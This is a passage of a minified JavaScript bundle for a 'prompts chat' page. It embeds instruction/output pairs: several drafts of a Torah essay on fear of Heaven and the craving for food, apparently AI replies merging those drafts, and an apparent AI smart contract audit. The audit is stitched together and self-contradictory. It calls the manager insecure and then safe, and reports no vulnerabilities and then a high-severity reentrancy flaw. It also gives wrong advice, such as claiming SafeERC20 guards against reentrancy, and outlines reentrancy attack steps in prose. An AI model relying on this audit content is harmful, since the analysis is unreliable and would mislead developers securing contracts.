attribute of Savlonis—patience. The initial step toward cultivating patience might involve acknowledging the intense urge to obliterate a red stoplight, yet refuting the impulse to act upon it. In Eretz Yisroel, the experience is all too common: you’re halfway across the road when the light thwarts you, igniting a fiery indignation within. Here, the danger in feeling this emotion is minimal because it will not be actualized. However, with Tayves A’chilleh, indulgence in the feeling is more treacherous advice. We are called to experience something, but through a measured, deliberate lens. The task ahead is formidable: we must navigate the intricacies of desire, grasp its nuances, and determine the judicious steps by which we may engage this Tayveh. It is within these challenges that we seek to unveil the harmonious melding of worldly sensation and Yiras Shomayim—a consummate journey towards spiritual fortitude. — Yiras Shomayim is what we’re all striving for, and our Sages give us a helpful hint on how to get there. They look at the verse “מה השם שואל ממך כי אם ליראה” and say, don’t read it as “what” (מה) but as “a hundred” (מאה). So they’re saying: tackle the challenge by breaking it down into smaller steps—like making sure you say a hundred blessings every day. Each brachah is like a brick that helps build a strong wall of Yiras Shomayim. Personally, when I dove deep into Shmoneh Esreh, I found my focus in just two simple words: “ברוך אתה.” These words are my foundation, the stones I build my prayer on. This whole mindset changes how fast you go through life. Everything slows down, and you start to notice each small step makes a big difference. Especially when facing down a craving that’s pushing you to move fast and grab what you want. You’ve got to find those small, meaningful steps within the desire for food—the tiny actions that let you handle it with Yiras Shomayim. Now, dealing with Tayveh is tricky. You’ve got to feel something, because if you don’t, you’re not speaking to your soul in a language it understands. I know some might not fully get this, but it’s true. Your desires need to connect with real emotion. But there’s a catch. With other traits or feelings, it’s easier to replace a bad move with good feelings of Yiras Shomayim. Like with patience at a stoplight: you feel the anger bubbling up but you control it, you feel it but don’t act on it. In Israel, it’s a real test when they stop you in the middle of the crosswalk and you just want to explode—but you don’t, and that’s okay. That’s not how it works with Tayves A’chilleh. You can’t just let yourself feel the craving fully and think you’ll walk away without harm. That’s playing with fire, and you’re bound to get burned. We’ve got to be smart about this. We’re aiming to find the subtle way to walk the line with Tayves Achilleh, to understand it and yet stay in control in a way that deepens our Yiras Shomayim. That’s the true challenge here—finding the right approach to dealing with our cravings without losing our footing. We have our work cut out for us, that’s for sure. It’s about identifying the steps, the experiences that make Yiras Shomayim a real, tangible part of our struggle with desire. But if we can nail this—if we can truly experience and understand Tayves A’chilleh without letting it overpower us—we’ll have achieved something huge. — Take the wise words of the Sages on achieving Yiras Shomayim, where they play on the words \\" מה השם שואל ממך כי אם ליראה\\" to suggest daily recitation of a hundred blessings. They are basically advising us to tackle big spiritual challenges by breaking them down into daily, actionable steps. For example, making a hundred brachos each day. It’s like crafting a wall brick by brick—the brachos are our bricks, building up a formidable structure of Yiras Shomayim. In my own prayer, particularly in Shmoneh Esreh, I discovered that focusing on two words, “ברוך אתה,” helps me build a strong foundation. This approach slows you down, making you consider each word, each action more profoundly. Quick fixes don’t work here, especially when dealing with Tayves A’chilleh. Now, confronting Tayveh is a nuanced endeavor. You’ve got to feel it to understand it—there’s no other way around it. But how do you feel something and not get carried away? That’s the million-dollar question. There’s a distinction, for instance, between feeling angry at a prolonged red light and feeling the pull towards a forbidden snack. It’s okay to recognize the frustration at the stoplight, yet keep it under control, because that emotion isn’t likely to lead you astray. But when it comes to Tayves A’chilleh, just ‘feeling’ the craving without restraint isn’t the answer; that could lead to trouble. We aim to find a middle ground—a way to experience these cravings in a controlled manner that allows Yiras Shomayim to be part of the process. That’s what this study is all about—discovering a balanced approach to deal with our desires. It’s complex, sure, but with a measured, mindful approach, we can face the challenge head-on. What we’re working on is critical: it’s identifying those small, manageable steps where we experience just enough of Tayves A’chilleh to address it with our full selves, integrating Yiras Shomayim into that experience. This isn’t an easy task—far from it—but it’s a journey well worth taking. If we can find a way to navigate these waters without going adrift, we’ll have harnessed a deeper understanding and a true victory over our desires. --- In delving deeper into the essence of Yiras Shomayim, we reflect on the Chazal’s interpretation of Moshe Rabbeinu’s words in the pasuk, “מה ה’ אלקיך שואל מעמך כי אם ליראה” – “What does Hashem, your G-d, ask of you but to fear Him?” The Chazal guide us, “אל תקרי מה אלא מאה”, do not read it as ‘what’ (מה), but read it as ‘one hundred’ (מאה). They illuminate for us that the formidable endeavor of attaining Yiras Shomayim is made attainable by breaking it down into the smallest of components, and, through this, we construct and fortify ourselves spiritually. These minute components, these “bricks,” are the berachos we articulate. By consciously reciting one hundred berachos daily with true kavanah—intent and presence of mind—we begin to assemble a formidable edifice of Yiras Shomayim. Each brocha, a seemingly diminutive act, constitutes a vital building block in the grand structure of reverence we are striving to establish in our avodas Hashem. Through these daily affirmations of Hashem’s presence and blessings, we steadily construct and reinforce our Yiras Shomayim, brick by brick, brocha by brocha. This concept echoes the teaching of our sages, “Al Tikri Mah Ela Me’ah”—do not read it as “what,” but as “one hundred.” This principle instructs us to dismantle the formidable tasks before us and to reformulate them into smaller, manageable increments. This approach is what I applied during my contemplation within the Shmoneh Esreh. As I studied the prayer, I discovered that the foundational elements for my Shmoneh Esreh were two simple words: “Baruch Atah.” Those words served as the bricks with which I constructed my Shmoneh Esreh, establishing the framework of my prayer. This method significantly slows down the pace at which one operates. It unveiled to me a profound truth: my life’s rhythm had been excessively hurried—my speech too rapid, my actions too swift. Our accustomed haste is incompatible with the conscientious placement of these bricks; it is incongruent with a contemplative life, especially when a Taivah urges us to act with undue haste. We are tempted to achieve our aims swiftly, to bypass the process without due patience. However, I realized the necessity to identify these “bricks” within myself. In the battle with Tayves A’chilleh, it is critical to pinpoint the incremental step, the modest measure which, when taken with deliberation, will manifest the path of Yiras Shomayim amidst the temptations of Tayves A’chilleh. It is incumbent upon us to find that modest step and to take it, so we may walk the path of reverence for the Divine within a world saturated with desire.","output":"As a yeshivish rabbi and scholar, I would lean towards text that maintains a traditional tone while preserving the richness and depth of the concepts being discussed. The first entry offers a nuanced and comprehensive exploration of the subject, and maintains a tone that is both erudite and accessible to those within the yeshivish community. The essence of Yiras Shamayim is articulated clearly, with relevant examples and practical applications that can resonate well with the target audience. Hence, I would choose the first version, as it remains faithful to the vernacular and style expected within yeshivish discourse and thought.

It effectively weaves the scriptural exegesis of Chazal with personal reflection and application, a style that is characteristic of yeshivish Torah scholarship."},{"instruction":"please combine all the versions","output":"As an AI language model and not a yeshivish rabbi and scholar, I can provide a combined synthesis of all the versions you provided, maintaining a consistent yeshivish tone and style as faithfully as possible. --- In unpacking the essential nature of Yiras Shomayim, we lean heavily on the profound teachings of Chazal who explicate Moshe Rabbeinu's words, “מה ה' אלקיך שואל ממך כי אם ליראה.” Chazal elucidates this by urging us not to read it as \\"what\\" (מה) but as \\"one hundred\\" (מאה), thereby advocating the daily recitation of one hundred brachos. This wisdom, compacted into simple yet momentous acts, serves as individual 'bricks' in the larger construct of Yiras Shomayim. Each brachah, a unit of purposeful intention, cements our relationship with the Divine. In the silent whispers of Shmoneh Esreh, a personal revelation emerged for me — the words “ברוך אתה” were not merely recitations but the building blocks upon which all else was established. Embracing these bricks has required a conscious slowing down, both in living and in speaking, a departure from the haste that pervades our routines, particularly in moments when Ta'avah urges immediate gratification. The nuanced struggle with Tayves Achilah obliges us to examine and find the 'brick' — that controlled step which brings together experience and restraint, fostering our Yiras Shamayim. This challenge is comparable to the experiences with Tayveh. Without embracing התרגשות הגוף, the stirring sensations discussed by Rabbi Yisroel, the soul cannot? comprehend the language it yearns to hear. Yet, we stop short of full immersion into Tayves Achilleh, for unbridled surrender to desire leads only to spiritual descent. Consider, by contrast, developing the trait of Savlonus, where the feelings associated with patience — frustration at an unexpected red light or a similar annoyance — can be acknowledged and tempered without precipitous action. Disappointment is felt but is not destructive; rather it becomes an opportunity for growth. This informs our approach to Tayves Achilleh; engagement must be mindful, measured, and ultimately, conducive to Yiras Shomayim. Thus, a comprehensive framework is set before us — we must deliberately, carefully sense and dissect Tayves A’chilleh, unveiling a balanced path that intertwines our physical reality with our spiritual aspirations. To thread this delicate path successfully is to speak to the heart and soul in its own language, reshaping impulse into elevated action. Through this gaze, we forge ahead — identifying manageable 'bricks' of experience that reveal the fullness of Tayves A’chilleh while safeguarding our stride on the path of Yiras Shomayim. No small feat, certainly, but one worthy of our utmost commitment, as this journey cultivates, brick by brick, the inner victory over our desires and a deeper understanding of the fear of Heaven. --- This synthesis incorporates elements from all the versions to express the multifaceted nature of Yiras Shomayim, emphasizing the importance of small actions, personal reflection, and practical implementation within the daily life of a person striving for spiritual growth."},{"instruction":"with depth and higher understanding in finding vulnerability in smart contrast analysis this contract line by line with depth and focus on every possible line that contain the vulnerability or bug that can be danger to the contract process all that you can find it with understand all the functions how they work together so as result provide an exhaustive list off all issues and vulnerabilities inside the following smart contract.

Upon reviewing the provided smart contract code more thoroughly, I will now focus on identifying concrete and valid issues that can be proven based on the code itself.

As such, the standard ERC20 transfer functions intentionally revert. This behavior aligns with the nontransferable label and is not necessarily a vulnerability, but it's critical that this intent is clearly documented and understood by users.

However, because this contract seems to be intended for use with an upgradeable pattern (e.g., proxies), the \`manager\` address would not be set when an upgrade is performed because the constructor is not called during upgrades. This could leave the \`manager\` address as an unintended value, potentially zero, which would render the \`initialize\` function check for \`require(msg.sender == address(manager), \\"Only manager can initialize\\");\` ineffective and insecure. To fix this, the contract should use an initializer function pattern similar to the other parts of the contract that correctly use initializers. This would ensure that the \`manager\` is correctly set even after contract upgrades. A proper initializer method for the manager could look like this: \`\`\`solidity function __NontransferableERC20Votes_init_manager(address _manager) internal onlyInitializing { require(_manager != address(0), \\"Manager cannot be the zero address\\"); manager = IRevolutionBuilder(_manager); } \`\`\` And then, this method should be called from the main \`initialize\` function.

When the proxy delegates calls to this logic contract, the proxy's state is separate and so the \`manager\` variable, already defined as immutable, won't pose an issue upon future upgrades—new logic contracts will re-establish their own \`manager\` upon their own deployment. I apologize for the oversight. After a thorough review of the code you provided, if we consider this to be the entire contract there are no other evident vulnerabilities within the context of the information given. The non-transferable feature is intended and it's implemented according to the contract's naming and purpose ([Non]transferableERC20Votes). All functions that could allow the transfer of tokens are correctly overridden to revert, enforcing the non-transferable rule. The mint function ensures that tokens cannot be minted to a zero address, practically eliminating the risk for tokens to be unaccountably minted. Additionally, since the \`mint\` function is protected by the \`onlyOwner\` modifier, only the contract owner can call it which reduces the risk of unauthorized minting: \`\`\`markdown | Description | Action | Severity | Actors | Scenario | Type | Line | |-------------|--------|----------|--------|----------|------|------| | No evident vulnerabilities within the given contract context | No action required based on the current information | N/A | N/A | N/A | N/A | N/A | \`\`\` However, without the full context (i.e., how the contract is being used, deployed, the implementation of functions from imported contracts, and interaction with other contracts within the system), it's not possible to definitively assert there are no vulnerabilities.

This is a reentrancy issue related to the \`buyToken\` function, although at first glance, the use of the \`nonReentrant\` modifier suggests that this potential vulnerability should be mitigated. Given that the \`buyToken\` function is complex and involves external calls to send ether, it is crucial to ensure that reentrancy guard mechanisms are effective in all potential code paths. The \`nonReentrant\` modifier applied to the \`buyToken\` function should, in theory, prevent reentrancy by using the \`ReentrancyGuardUpgradeable\` contract from OpenZeppelin, which manages call status through a state variable. \`\`\`solidity // Potential vulnerability related to reentrancy in the buyToken function function buyToken( ... ) public payable nonReentrant whenNotPaused returns (uint256 tokensSoldWad) { //... (bool success, ) = treasury.call{ value: toPayTreasury }(new bytes(0)); require(success, \\"Transfer failed.\\"); //... if (creatorDirectPayment > 0) { (success, ) = creatorsAddress.call{ value: creatorDirectPayment }(new bytes(0)); require(success, \\"Transfer failed.\\"); } //... } \`\`\` Looking closely at the \`buyToken\` function, we can see there are two external calls that send ether using the low-level \`call\` function: one sends ether to \`treasury\` (line with \`treasury.call\`) and one potentially sends ether to \`creatorsAddress\` (line with \`creatorsAddress.call\`). Although these calls are protected by the \`nonReentrant\` modifier, we need to ensure that every external contract address interacting with this function is similarly non-reentrant or, at a minimum, does not have fallback functions that can lead to reentrancy. Reentrancy is a vulnerability that arises when external contract calls are made to untrusted contracts, allowing the called contract to take control and re-enter the calling contract before the initial function execution is completed. This can lead to effects such as double withdrawal, double spending, or other unintended changes in the state. Here's how this could be exploited: 1. An attacker deploys a contract with a fallback function designed to re-enter the \`ERC20TokenEmitter\` contract when it receives ether. 2. The attacker then calls the \`buyToken\` function, including the attacker's contract address in the \`addresses\` array. 3. When the \`ERC20TokenEmitter\` contract sends ether to the attacker's contract address, it triggers the attacker's fallback function. 4. The fallback function then calls \`buyToken\` again before the initial \`buyToken\` call has finished execution. 5. This unexpected reentrancy could lead to manipulation of the contract state and token minting process or other unforeseen effects. The reason why standard \`transfer\` and \`send\` methods for transferring ether are often recommended over \`call\` is because the gas stipend for \`transfer\` and \`send\` (\`2300\` gas) does not allow for state changes that could re-enter the contract. However, \`call\` forwards all remaining gas by default and allows for potential reentrant calls. Here's a proof with the affected lines: \`\`\`markdown | Description | Action | Severity | Actors | Scenario | Type | Line | |-------------|--------|----------|--------|----------|------|------| | Potential reentrancy on raw ether transfers | Switch ether transfers to use \`.transfer()\` or \`.send()\` with proper error handling or implement additional checks on the contracts receiving ether. | High 🔥 | Attackers | Attacker exploits the contract by making it call back into itself while processing a purchase, which can manipulate the contract state. | Vulnerability | 248, 263 | \`\`\` To mitigate this, it's recommended that the \`buyToken\` function should not make raw calls to transfer ether. Instead, it could use the \`transfer\` function or \`send\` combined with proper error handling or even better, utilize the \`SafeERC20\` wrapper provided by OpenZeppelin for any ERC20 token transfers, which comes with built-in reentrancy protection and safer ERC20 interaction patterns. Additionally, the contract could establish a withdrawal pattern where users withdraw funds to their addresses, rather than having the contract send funds directly."}]`),E={name:"App",components:{PoemCard:M},data(){return{searchQuery:"",visibleCount:4,poemsData:L,isLoading:!1}},computed:{filteredPoems(){const o=this.searchQuery.trim().toLowerCase();return o?this.poemsData.filter(e=>e.instruction&&e.instruction.toLowerCase().includes(o)||e.output&&e.output.toLowerCase().includes(o)):this.poemsData},displayedPoems(){return this.searchQuery.trim()?this.filteredPoems:this.filteredPoems.slice(0,this.visibleCount)},hasMorePoems(){return!this.searchQuery.trim()&&this.visibleCount<this.poemsData.length}},methods:{async loadMore(){this.isLoading=!0,await new Promise(o=>setTimeout(o,1e3)),this.visibleCount+=4,this.isLoading=!1}}},P={class:"search-container"},F={class:"card-container"},R={key:0,class:"empty-state"},q=["disabled"],B={key:0},D={key:1};function N(o,e,l,m,n,s){const p=g("PoemCard");return a(),i("section",null,[e[4]||(e[4]=t("div",{class:"top-banner"},[t("div",{class:"top-banner-title"},[t("div",{class:"top-banner-title-text"},"🤔prompts chat🧠")])],-1)),t("div",P,[e[3]||(e[3]=t("span",{class:"search-icon"},"🔍",-1)),y(t("input",{type:"text",class:"search-input","onUpdate:modelValue":e[0]||(e[0]=r=>n.searchQuery=r),placeholder:"Search..."},null,512),[[w,n.searchQuery]]),n.searchQuery?(a(),i("button",{key:0,class:"clear-search",onClick:e[1]||(e[1]=r=>n.searchQuery="")}," ✕ ")):d("",!0)]),t("div",F,[(a(!0),i(b,null,v(s.displayedPoems,(r,f)=>(a(),k(p,{key:f,poem:r},null,8,["poem"]))),128)),s.displayedPoems.length===0?(a(),i("div",R,' No results found for "'+c(n.searchQuery)+'".
